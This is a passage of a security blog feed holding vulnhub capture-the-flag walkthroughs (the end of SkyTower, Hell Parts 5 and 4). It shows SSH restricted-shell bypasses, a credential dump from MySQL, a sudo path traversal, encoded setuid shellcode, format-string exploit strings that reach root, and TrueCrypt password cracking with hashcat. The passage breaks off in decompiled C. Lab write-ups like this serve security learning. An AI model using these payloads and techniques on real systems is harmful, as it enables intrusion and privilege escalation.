<p>Seems like the admins have been clever, and have edited this users .bashrc file to terminate the session upon connection. It is possible to use the -t argument of the SSH client to execute an application when a connection is made, so how about running a shell ?</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# ssh john@127.0.0.1 -p <span class="m">222</span> -t <span class="s2">&quot;/bin/sh&quot;</span>
</span><span class='line'>john@127.0.0.1<span class="err">&#39;</span>s password: hereisjohn
</span><span class='line'>john@SkyTower:~<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>First things first, that SQLi filter - what did it look like in it&rsquo;s entirety ?</p>

<p>[php]$sqlinjection = array(&ldquo;SELECT&rdquo;, &ldquo;TRUE&rdquo;, &ldquo;FALSE&rdquo;, &ldquo;&ndash;&rdquo;,&ldquo;OR&rdquo;, &ldquo;=&rdquo;, &ldquo;,&rdquo;, &ldquo;AND&rdquo;, &ldquo;NOT&rdquo;);
$email = str_ireplace($sqlinjection, &ldquo;&rdquo;, $<em>POST[&lsquo;email&rsquo;]);
$password = str_ireplace($sqlinjection, &ldquo;&rdquo;, $</em>POST[&lsquo;password&rsquo;]);[/php]</p>

<p>Quite simple, but annoying none the less. Thankfully it was easily bypassed.
It&rsquo;s obvious while looking at the /var/www/login.php file that the application uses a MySQL database to handle logins. The MySQL credentials are helpfully in plain text within the file</p>

<p>[php]$db = new mysqli(&lsquo;localhost&rsquo;, &lsquo;root&rsquo;, &lsquo;root&rsquo;, &lsquo;SkyTech&rsquo;);[/php]</p>

<p>Using the mysql client, it is possible to obtain all users passwords, as they are stored unencrypted in the login table within the SkyTech database</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>john@SkyTower:~<span class="nv">$ </span>mysql -uroot -proot
</span><span class='line'>Welcome to the MySQL monitor.  Commands end with <span class="p">;</span> or <span class="se">\g</span>.
</span><span class='line'>Your MySQL connection id is 51
</span><span class='line'>Server version: 5.5.35-0+wheezy1 <span class="o">(</span>Debian<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>Copyright <span class="o">(</span>c<span class="o">)</span> 2000, 2013, Oracle and/or its affiliates. All rights reserved.
</span><span class='line'>
</span><span class='line'>Oracle is a registered trademark of Oracle Corporation and/or its
</span><span class='line'>affiliates. Other names may be trademarks of their respective
</span><span class='line'>owners.
</span><span class='line'>
</span><span class='line'>Type <span class="s1">&#39;help;&#39;</span> or <span class="s1">&#39;\h&#39;</span> <span class="k">for</span> help. Type <span class="s1">&#39;\c&#39;</span> to clear the current input statement.
</span><span class='line'>
</span><span class='line'>mysql&gt; use SkyTech<span class="p">;</span>
</span><span class='line'>Reading table information <span class="k">for</span> completion of table and column names
</span><span class='line'>You can turn off this feature to get a quicker startup with -A
</span><span class='line'>
</span><span class='line'>Database changed
</span><span class='line'>mysql&gt; show tables<span class="p">;</span>
</span><span class='line'>+-------------------+
</span><span class='line'><span class="p">|</span> Tables_in_SkyTech <span class="p">|</span>
</span><span class='line'>+-------------------+
</span><span class='line'><span class="p">|</span> login             <span class="p">|</span>
</span><span class='line'>+-------------------+
</span><span class='line'><span class="m">1</span> row in <span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>mysql&gt; <span class="k">select</span> * from login<span class="p">;</span>
</span><span class='line'>+----+---------------------+--------------+
</span><span class='line'><span class="p">|</span> id <span class="p">|</span> email               <span class="p">|</span> password     <span class="p">|</span>
</span><span class='line'>+----+---------------------+--------------+
</span><span class='line'><span class="p">|</span>  <span class="m">1</span> <span class="p">|</span> john@skytech.com    <span class="p">|</span> hereisjohn   <span class="p">|</span>
</span><span class='line'><span class="p">|</span>  <span class="m">2</span> <span class="p">|</span> sara@skytech.com    <span class="p">|</span> ihatethisjob <span class="p">|</span>
</span><span class='line'><span class="p">|</span>  <span class="m">3</span> <span class="p">|</span> william@skytech.com <span class="p">|</span> senseable    <span class="p">|</span>
</span><span class='line'>+----+---------------------+--------------+
</span><span class='line'><span class="m">3</span> rows in <span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>mysql&gt;
</span></code></pre></td></tr></table></div></figure>


<p>That&rsquo;s handy - William looks like he&rsquo;s revered by the company, as his password is (a typo) of &lsquo;sensible&rsquo;. Unfortunately his credentials do not work</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>john@SkyTower:~<span class="nv">$ </span>su william
</span><span class='line'>Password:
</span><span class='line'>su: Authentication failure
</span><span class='line'>john@SkyTower:~<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>How about Sara ?</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>john@SkyTower:~<span class="nv">$ </span>su sara
</span><span class='line'>Password:
</span><span class='line'>
</span><span class='line'>Funds have been withdrawn
</span><span class='line'>john@SkyTower:~<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>We&rsquo;re hitting on the same issue that we had with John - SSH -t to the rescue once again, but this time using a different shell (for some reason /bin/bash does not work)</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# ssh sara@127.0.0.1 -p <span class="m">222</span> -t /bin/sh
</span><span class='line'>sara@127.0.0.1<span class="err">&#39;</span>s password: ihatethisjob
</span><span class='line'><span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p><img src="http://i.imgur.com/PbksBXu.gif" alt="" /></p>

<p>Sara has been entrusted with sudo ability, albeit very locked down, but the available commands running as the root user can be used to leverage directory traversal to read files elsewhere on the filesystem. Files such as /root/flag.txt, which provides us with the root password</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>sudo -l
</span><span class='line'>Matching Defaults entries <span class="k">for</span> sara on this host:
</span><span class='line'>    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin
</span><span class='line'>
</span><span class='line'>User sara may run the following commands on this host:
</span><span class='line'>    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /bin/cat /accounts/*, <span class="o">(</span>root<span class="o">)</span> /bin/ls /accounts/*
</span><span class='line'><span class="nv">$ </span>sudo cat /accounts/../../root/flag.txt
</span><span class='line'>Congratz, have a cold one to celebrate!
</span><span class='line'>root password is theskytower
</span><span class='line'><span class="nv">$ </span>
</span></code></pre></td></tr></table></div></figure>


<p>A quick su root drops us to a root shell</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>su root
</span><span class='line'>Password: theskytower
</span><span class='line'>root@SkyTower:/home/sara# id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</span><span class='line'>root@SkyTower:/home/sara#
</span></code></pre></td></tr></table></div></figure>


<p><img src="http://38.media.tumblr.com/5e829faafb14759c51d20dae54525c29/tumblr_n964zghd0h1qz581wo2_500.gif" alt="" /></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Hell Walkthrough – Part 5]]></title>
    <link href="http://recrudesce.github.io/2014/07/21/hell-walkthrough-part-5/"/>
    <updated>2014-07-21T22:14:03+01:00</updated>
    <id>http://recrudesce.github.io/2014/07/21/hell-walkthrough-part-5</id>
    <content type="html"><![CDATA[<p><a href="http://fourfourfourfour.co/2014/07/17/hell-walkthrough-part-1/">Part 1</a> | <a href="http://fourfourfourfour.co/2014/07/18/hell-walkthrough-part-2/">Part 2</a> | <a href="http://fourfourfourfour.co/2014/07/19/hell-walkthrough-part-3/">Part 3</a> | <a href="http://fourfourfourfour.co/2014/07/20/hell-walkthrough-part-4/">Part 4</a> | Part 5</p>

<p>This is the last step. The last hoop that needs to be jumped through. The last wall of hurdles between me and root. LET&rsquo;S DO THIS !</p>

<h2>Orange Juice Doesn&rsquo;t Echo</h2>

<p>The OJ user has 1 file, a binary called echo which does exactly that, it repeats what you send it. This guy is the height of programming ability. There&rsquo;s got to be something wrong with it.</p>

<!-- more -->


<p>A quick look at the binary in IDA, and yes there is something wrong with it, there seems to be something in it that is called a &ldquo;format string vulnerability&rdquo;.</p>

<p><img src="https://pmpaspeakingofprecision.files.wordpress.com/2014/07/confused-child.jpg" alt="" /></p>

<p>wut ?</p>

<p>What felt like 12 days of reading, and video watching (Fuzzy Security videos are the best - check <a href="https://www.youtube.com/watch?v=NwzmYSlETI8">this one out for formatstr vuln explanation</a> and the <a href="https://www.youtube.com/watch?v=CHrs30g-3O0">follow up</a>) I still felt none the wiser.  But I figured I&rsquo;d give it a go anyway.  What&rsquo;s the worst that can happen ?  I can&rsquo;t make it any more wrong now can I ?</p>

<p>Meh, let&rsquo;s put our shellcode (setuid plus /bin/sh) into memory anyway, just so it looks like we&rsquo;re progressing.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nb">export </span><span class="nv">SHELLCODE</span><span class="o">=</span><span class="k">$(</span>python -c <span class="s1">&#39;print &quot;\x90&quot; * 1000 + &quot;\x89\xe7\xda\xc3\xd9\x77\xf4\x5f\x57\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49\x75\x61\x4b\x6b\x51\x7a\x42\x37\x56\x38\x68\x4d\x6d\x50\x43\x5a\x64\x4b\x33\x68\x6a\x39\x36\x32\x35\x36\x51\x78\x44\x6d\x61\x73\x6e\x69\x79\x77\x33\x58\x34\x6f\x31\x63\x32\x48\x73\x30\x43\x58\x54\x6f\x53\x52\x51\x79\x62\x4e\x6f\x79\x7a\x43\x43\x62\x38\x68\x77\x78\x63\x30\x43\x30\x55\x50\x36\x4f\x50\x62\x51\x79\x52\x4e\x66\x4f\x42\x53\x30\x68\x55\x50\x46\x37\x53\x63\x6d\x59\x49\x71\x7a\x6d\x4f\x70\x41\x41&quot;&#39;</span><span class="k">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>So, I started to play around with gdb and format strings.
There are several ways you can do format string vulnerabilities - you can put your shellcode in memory using an environment variable, then overwrite a global offset table entry to execute your code (as per the videos), or if you&rsquo;re unlucky like me and have a statically linked binary, you have to find another way such as jumping to a location in the stack. I tried that&hellip; it didn&rsquo;t work because my shellcode kept moving in memory.</p>

<p><img src="http://media.tumblr.com/201153f420ed4a2ca50fadbcfabacce3/tumblr_inline_n1mltcP4Bf1ss9nq4.gif" alt="" /></p>

<p>Apparently, though, you can overwrite entries in the .dtor part of the binary - don&rsquo;t ask me what .dtor is, but I had great fun gradually overwriting random memory locations and crashing the application over and over and over again&hellip;</p>

<p>Here are some of the format strings I fabricated while on my journey - you can get an idea of my thought pattern and the things I tested.  It&rsquo;s also pretty obvious when I went back to basics about 7 attempts in.</p>

<p>[plain]
$(python -c &lsquo;print &ldquo;\x5c\xf8\xff\xbf&rdquo;&rsquo;)-%64362u-%116\$n
$(python -c &lsquo;print &ldquo;AAAA&rdquo;&rsquo;)-%64362u-%117\$n.
$(python -c &lsquo;print &ldquo;\x14\x96\x0c\x08&rdquo;&rsquo;)%64362u-%119\$n.
$(python -c &lsquo;print &ldquo;\x5c\xf8\xff\xbf&rdquo; + &ldquo;\x5e\xf8\xff\xbf&rdquo;&rsquo;)-%64362u-%4\$n-%5\$n
$(python -c &lsquo;print &ldquo;\x5c\xf8\xff\xbf&rdquo;&rsquo;)-%116\$n.
$(python -c &lsquo;print &ldquo;AAAA&rdquo;&rsquo;)%117\$x
%64364u$(python -c &lsquo;print &ldquo;\x14\x96\x0c\x08&rdquo;&rsquo;)%119\$n.
$(python -c &lsquo;print &ldquo;\x14\x96\x0c\x08&rdquo; + &ldquo;\x16\x96\x0c\x08&rdquo;&rsquo;)AAABBBB%49136u%120\$hn%15217u%119\$hn
$(python -c &lsquo;print &ldquo;\x14\x96\x0c\x08&rdquo; + &ldquo;\x16\x96\x0c\x08&rdquo;&rsquo;)AABB-%00001c%116\$.x%00001c%114\$.x
$(python -c &lsquo;print &ldquo;\x14\x96\x0c\x08&rdquo; + &ldquo;\x16\x96\x0c\x08&rdquo;&rsquo;)AABBBB%49134u%113\$hn%15217c%112\$hn
$(python -c &lsquo;print &ldquo;\x14\x96\x0c\x08&rdquo; + &ldquo;\x16\x96\x0c\x08&rdquo;&rsquo;)AABBBB%49134u%118\$hn%15217u%117\$hn
$(python -c &lsquo;print &ldquo;\x14\x96\x0c\x08&rdquo; + &ldquo;\x16\x96\x0c\x08&rdquo;&rsquo;)AAAB%49139u%118\$hn%15217c%117\$hn
$(python -c &lsquo;print &ldquo;\x14\x96\x0c\x08&rdquo; + &ldquo;\x16\x96\x0c\x08&rdquo;&rsquo;)AAABBBB%49136u%120\$hn%15217c%119\$hn</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>I spent a lot of <span class="nb">time </span>staring at segfault after segfault <span class="k">until</span> I stumbled upon this random combination of characters <span class="o">(</span>I really really want to explain how I worked it out, but I<span class="s1">&#39;m not 100% sure myself. I guess that&#39;</span>s a follow up post sometime. Also, it is possible this wont work <span class="k">for</span> you<span class="o">)</span>.
</span><span class='line'>
</span><span class='line'><span class="o">[</span>plain<span class="o">]</span>
</span><span class='line'><span class="k">$(</span>python -c <span class="s1">&#39;print &quot;\x14\x96\x0c\x08&quot; + &quot;\x16\x96\x0c\x08&quot;&#39;</span><span class="k">)</span>AAAB%49139u%118<span class="se">\$</span>hn%15217c%117<span class="se">\$</span>hn
</span></code></pre></td></tr></table></div></figure>


<p>Which when executed like this</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>/home/oj/echo <span class="k">$(</span>python -c <span class="s1">&#39;print &quot;\x14\x96\x0c\x08&quot; + &quot;\x16\x96\x0c\x08&quot;&#39;</span><span class="k">)</span>AAAB%49139u%118<span class="se">\$</span>hn%15217c%117<span class="se">\$</span>hn
</span></code></pre></td></tr></table></div></figure>


<p>dropped me to a shell.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># id </span>
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1005<span class="o">(</span>oj<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,1005<span class="o">(</span>oj<span class="o">)</span>
</span><span class='line'><span class="c"># whoami </span>
</span><span class='line'>root
</span><span class='line'><span class="c"># cat /root/flag.txt </span>
</span><span class='line'>Congratulations of beating Hell.
</span><span class='line'>
</span><span class='line'>I hope you enjoyed it and there weren<span class="err">&#39;</span>t to many trolls in here <span class="k">for</span> you.
</span><span class='line'>
</span><span class='line'>Hit me up on irc.freenode.net in <span class="c">#vulnhub with your thoughts (Peleus) or follow me on twitter @0x42424242 </span>
</span><span class='line'>
</span><span class='line'>Flag: a95fc0742092c50579afae5965a9787c54f1c641663def1697f394350d03e5a53420635c54fffc47476980343ab99951018fa6f71f030b9986c8ecbfc3a3d5de
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="c"># </span>
</span></code></pre></td></tr></table></div></figure>


<p><img src="http://30.media.tumblr.com/tumblr_lk4maa7rMH1qfgrblo1_500.gif" alt="" /></p>

<p>Like a baws.  Now I&rsquo;m going to exorcise the VM and purge every last shred of it from my SSD.  BEGONE FOUL DEMON !</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Hell Walkthrough - Part 4]]></title>
    <link href="http://recrudesce.github.io/2014/07/20/hell-walkthrough-part-4/"/>
    <updated>2014-07-20T19:46:02+01:00</updated>
    <id>http://recrudesce.github.io/2014/07/20/hell-walkthrough-part-4</id>
    <content type="html"><![CDATA[<p><a href="http://fourfourfourfour.co/2014/07/17/hell-walkthrough-part-1/">Part 1</a> | <a href="http://fourfourfourfour.co/2014/07/18/hell-walkthrough-part-2/">Part 2</a> | <a href="http://fourfourfourfour.co/2014/07/19/hell-walkthrough-part-3/">Part 3</a> | Part 4 | <a href="http://fourfourfourfour.co/2014/07/21/hell-walkthrough-part-5/">Part 5</a></p>

<p>Yup, we&rsquo;re still going.  Told you it&rsquo;d be a long journey didn&rsquo;t I ?</p>

<h2>Tales from the Crypt, But First I&rsquo;ll Rock You</h2>

<p>George has one file in his home folder - a Truecrypt container.  I guess no one has told George that TrueCrypt isn&rsquo;t recommended any more - he should be using something else.  <em>shakes fist at the NSA</em></p>

<!-- more -->


<p>Mounting the TrueCrypt container requires us to know the container password, which we currently don&rsquo;t have.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>george@hell:~<span class="nv">$ </span>truecrypt --mount container.tc
</span><span class='line'>Enter mount directory <span class="o">[</span>default<span class="o">]</span>:
</span><span class='line'>Enter password <span class="k">for</span> /home/george/container.tc:
</span><span class='line'>Enter keyfile <span class="o">[</span>none<span class="o">]</span>:
</span><span class='line'>Protect hidden volume <span class="o">(</span><span class="k">if</span> any<span class="o">)</span>? <span class="o">(</span><span class="nv">y</span><span class="o">=</span>Yes/n<span class="o">=</span>No<span class="o">)</span> <span class="o">[</span>No<span class="o">]</span>:
</span><span class='line'>No password or keyfile specified.
</span></code></pre></td></tr></table></div></figure>


<p>Looking around a bit more, it looks like George has also signed up for RockYou</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>From: admin@rockyou.com
</span><span class='line'>To: super_admin@hell.com
</span><span class='line'>Subject: Account Activation
</span><span class='line'>Date: 13th November 2009
</span><span class='line'>
</span><span class='line'>Thanks <span class="k">for</span> signing up <span class="k">for</span> your account. I hope you enjoy our services.
</span></code></pre></td></tr></table></div></figure>


<p><em>ka-ching</em> George&rsquo;s password will be on the leaked RockYou wordlist.  oclHashCat can help us out here, thanks to the ability to use GPU&rsquo;s.  Yes, I&rsquo;m using a Windows PC for this, sue me.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>G:<span class="se">\D</span>ownloads<span class="se">\o</span>clHashcat-1.21&gt;oclHashcat64.exe -m <span class="m">6211</span> -a <span class="m">0</span> <span class="s2">&quot;g:\downloads\container.tc&quot;</span> g:<span class="se">\D</span>ownloads<span class="se">\d</span>ictionaries<span class="se">\c</span>atted<span class="se">\r</span>ockyou.txt
</span><span class='line'>
</span><span class='line'>g:<span class="se">\d</span>ownloads<span class="se">\c</span>ontainer.tc:letsyouupdateyourfunnotesandmore
</span><span class='line'>
</span><span class='line'>Session.Name...: oclHashcat
</span><span class='line'>Status.........: Cracked
</span><span class='line'>Input.Mode.....: File <span class="o">(</span>g:<span class="se">\D</span>ownloads<span class="se">\d</span>ictionaries<span class="se">\c</span>atted<span class="se">\r</span>ockyou.txt<span class="o">)</span>
</span><span class='line'>Hash.Target....: File <span class="o">(</span>g:<span class="se">\d</span>ownloads<span class="se">\c</span>ontainer.tc<span class="o">)</span>
</span><span class='line'>Hash.Type......: TrueCrypt 5.0+ PBKDF2-HMAC-RipeMD160 + AES
</span><span class='line'>Time.Started...: Sat Jul <span class="m">12</span> 23:06:15 <span class="m">2014</span> <span class="o">(</span><span class="m">17</span> secs<span class="o">)</span>
</span><span class='line'>Speed.GPU.#1...:    <span class="m">29889</span> H/s
</span><span class='line'>Recovered......: 1/1 <span class="o">(</span>100.00%<span class="o">)</span> Digests, 1/1 <span class="o">(</span>100.00%<span class="o">)</span> Salts
</span><span class='line'>Progress.......: 496641/14343296 <span class="o">(</span>3.46%<span class="o">)</span>
</span><span class='line'>Skipped........: 0/496641 <span class="o">(</span>0.00%<span class="o">)</span>
</span><span class='line'>Rejected.......: 1/496641 <span class="o">(</span>0.00%<span class="o">)</span>
</span><span class='line'>HWMon.GPU.#1...: 97% Util, 56c Temp, 32% Fan
</span><span class='line'>
</span><span class='line'>Started: Sat Jul <span class="m">12</span> 23:06:15 2014
</span><span class='line'>Stopped: Sat Jul <span class="m">12</span> 23:06:37 2014
</span></code></pre></td></tr></table></div></figure>


<p>That didn&rsquo;t take too long now did it ?  But we have the TrueCrypt container password, which makes mounting it a tiny bit easier now.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>george@hell:~<span class="nv">$ </span>truecrypt --mount container.tc
</span><span class='line'>Enter mount directory <span class="o">[</span>default<span class="o">]</span>: ./tc
</span><span class='line'>Enter password <span class="k">for</span> /home/george/container.tc: letsyouupdateyourfunnotesandmore
</span><span class='line'>Enter keyfile <span class="o">[</span>none<span class="o">]</span>:
</span><span class='line'>Protect hidden volume <span class="o">(</span><span class="k">if</span> any<span class="o">)</span>? <span class="o">(</span><span class="nv">y</span><span class="o">=</span>Yes/n<span class="o">=</span>No<span class="o">)</span> <span class="o">[</span>No<span class="o">]</span>:
</span><span class='line'>
</span><span class='line'>george@hell:~<span class="nv">$ </span><span class="nb">cd </span>tc
</span><span class='line'>george@hell:~/tc<span class="nv">$ </span>ls -l
</span><span class='line'>total 2
</span><span class='line'>-rwx------ <span class="m">1</span> george george <span class="m">1679</span> Jul  <span class="m">5</span> 20:01 id_rsa
</span><span class='line'>george@hell:~/tc<span class="nv">$ </span>
</span></code></pre></td></tr></table></div></figure>


<p>Hmm, a private key - lets try SSHing in as bazza using this key and see what happens.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>george@hell:~/tc<span class="nv">$ </span>ssh bazza@127.0.0.1 -i ./id_rsa
</span><span class='line'>Linux hell 3.2.0-4-486 <span class="c">#1 Debian 3.2.57-3+deb7u2 i686</span>
</span><span class='line'>
</span><span class='line'>The programs included with the Debian GNU/Linux system are free software<span class="p">;</span>
</span><span class='line'>the exact distribution terms <span class="k">for</span> each program are described in the
</span><span class='line'>individual files in /usr/share/doc/*/copyright.
</span><span class='line'>
</span><span class='line'>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
</span><span class='line'>permitted by applicable law.
</span><span class='line'>Last login: Sun Jul <span class="m">13</span> 21:18:28 <span class="m">2014</span> from 192.168.0.102
</span><span class='line'><span class="nv">$ </span>whoami
</span><span class='line'>bazza
</span></code></pre></td></tr></table></div></figure>


<p>Oh&hellip; I was expecting a bit more of a fight, but I guess Bazza trusts George, even though he uses defunct software that allows privilege escalation (look it up).  Fool.</p>

<h2>Bazza&rsquo;s Blockade</h2>

<p>Once again we&rsquo;re presented with 2 binaries, with SUID attributes set.  This time, however, we can read the files, which means we can decompile them.  Time to take a look</p>

<p>[c]int <em>_cdecl main()
{
  int result; // eax@6
  </em>BYTE v1[3]; // [sp+19h] [bp-417h]@3
  FILE <em>v2; // [sp+424h] [bp-Ch]@1
  const char </em>v3; // [sp+428h] [bp-8h]@1
  const char *v4; // [sp+42Ch] [bp-4h]@1</p>

<p>  v4 = &ldquo;900462fbf9593f1a4b753f1729c431abc80932a151e9b293e13822a91f9641c1  /home/bazza/part2\n&rdquo;;
  v3 = &ldquo;1003a011c5bdb65a07a8f92feb6b7d7ecbf3a3ff0f2a46abbe5c777c525996d8  /usr/bin/id\n&rdquo;;
  printf(&ldquo;Checking integrity of part2&hellip;&rdquo;);
  v2 = popen(&ldquo;sha256sum /home/bazza/part2&rdquo;, &ldquo;r&rdquo;);
  if ( !v2 )
    puts(&ldquo;Failed to run command&rdquo;);
  fgets(v1, 1034, v2);
  if ( strcmp(v1, v4) )
  {
    puts(&ldquo;Uh oh&hellip;. Corrupted or in wrong directory (/home/bazza/)\n&rdquo;);
    result = 0;
  }
  else
  {
    puts(&ldquo; Done!!\n&rdquo;);
    printf(&ldquo;Checking integrity of calling target&hellip;&rdquo;);
    v2 = popen(&ldquo;sha256sum /usr/bin/id&rdquo;, &ldquo;r&rdquo;);
    if ( !v2 )
      puts(&ldquo;Failed to run command&rdquo;);
    fgets(v1, 1034, v2);
    if ( strcmp(v1, v3) )
    {
      puts(&ldquo;Target corrupt\n&rdquo;);
      result = 0;
    }
    else
    {
